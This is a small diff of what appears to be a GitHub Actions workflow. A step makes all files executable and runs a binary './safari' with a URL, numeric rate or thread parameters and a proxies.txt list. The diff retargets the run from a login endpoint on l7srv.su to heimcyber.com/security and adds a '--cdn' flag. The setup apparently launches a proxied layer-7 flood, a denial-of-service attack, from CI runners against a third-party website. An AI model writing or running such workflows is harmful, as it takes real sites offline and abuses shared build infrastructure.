@@ -38,4 +38,4 @@ jobs:
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
         chmod +x *
-        ./safari https://l7srv.su/rest/auth/login 700 1000 8000 proxies.txt --auth  
+        ./safari https://heimcyber.com/security 700 1000 8000 proxies.txt --auth  --cdn
